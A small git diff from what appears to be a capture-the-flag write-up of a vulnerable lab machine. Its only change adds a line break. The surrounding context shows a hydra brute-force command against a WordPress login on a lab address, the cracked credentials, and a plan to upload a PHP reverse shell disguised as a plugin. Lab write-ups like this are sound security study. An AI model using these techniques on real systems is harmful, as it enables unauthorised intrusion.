@@ -33,7 +33,7 @@ You can check the lenght of the file before and after using this command:
 Then run password bruteforcing.
 `hydra -l Elliot -P n_fsocity.dic 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:The password you entered" -V`
 
-Username: _Elliot_
+Username: _Elliot_<br>
 Password: _ER28-0652_
 
 Looks like I can upload my own plugins, so I found a simple php reverse-shell, and zipped it, so wordpress thinks it is a plugin.
